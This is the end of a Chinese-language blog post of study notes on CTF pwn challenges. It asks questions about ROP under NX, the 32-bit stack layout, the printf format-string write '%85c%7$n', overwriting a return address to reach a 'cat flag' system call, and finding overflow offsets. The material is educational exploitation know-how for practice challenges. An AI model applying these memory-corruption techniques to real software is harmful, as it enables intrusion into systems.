</span></span></code></pre></div><h1 id=问题>问题</h1><h2 id=level0中若是用system的plt地址最后如何修复堆栈平衡>Level0中若是用system的plt地址，最后如何修复堆栈平衡？</h2><h2 id=为什么不能用got地址直接接字符串呢-level2>为什么不能用GOT地址直接接字符串呢？-Level2</h2><p>因为开启了NX，所以要用ROP，在 32 位程序运行中，函数参数直接压入栈中调用函数时栈的结构为：调用函数地址->函数的返回地址->参数 n->参数 n1->···->参数 1</p><h2 id=85c7n>%85c%7$n</h2><p>在 <em>printf</em> 中，使用 <em>&lt;a_number_of_chars>%<number>$n</em> 就可以将相应的第 <em><number></em>个参数的位置写为 <em>%</em> 前输出的字符数量</p><p>如本题先用 <em>%85c</em> 输出了85个字符，再用 <em>%7$n</em> 将第七个参数的位置写成了85</p><h2 id=将返回位覆盖为cat-flag怎么就执行这个了呢-intoverflow>将返回位覆盖为cat flag,怎么就执行这个了呢？-intoverflow</h2><p>cat flag在what is this 函数中，紧跟的就是system函数，所以可以执行</p><h2 id=溢出的偏移大小-cgpwn2>溢出的偏移大小？-cgpwn2</h2><p>第一次构造200大小字符串时，测得偏移大小为91，然而直接用IDA看变量S距离EBP为38，加上3，即42，于是构造500大小字符串，这时偏移为42了，这两种有什么区别吗？以什么为准呢</p><p>猜测构造200的时候，正好经历了跳转到了新的位置</p><h1 id=参考链接>参考链接</h1><p><a href=https://www.sugger.fun/index.php/archives/56/>[攻防世界]pwn-string - zero2pwn</a></p><p><a href=https://blog.csdn.net/Casuall/article/details/107639710>攻防世界 string WP_Casuall的博客-CSDN博客</a></p><p><a href=https://frozenkp.github.io/pwn/format_string/>Format String</a></p>           </div>       </article>   </main><div class="disqus markdown"><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//vincebye.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://github.com/Vincebye/ target=_blank rel="noopener noreferrer me" title=Github><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a><a href=https://twitter.com/vincebye target=_blank rel="noopener noreferrer me" title=Twitter><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></a><a href=mailto:0xvincebye@gmail.com target=_blank rel="noopener noreferrer me" title=Email><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></a><a href=index.xml target=_blank rel="noopener noreferrer me" title=Rss><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><small class=footer_copyright>© 2023 Vincebye.
Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel="noreferrer noopener">Hugo blog awesome</a>
theme on
<a href=https://gohugo.io target=_blank rel="noreferrer noopener">Hugo</a>.</small></footer><script src=https://vincebye.github.io/js/themeSwitchnMenu.min.2a402288242b6930b175a0722c267e2353055739b3975834df35e56d00dd8f50.js></script></body></html>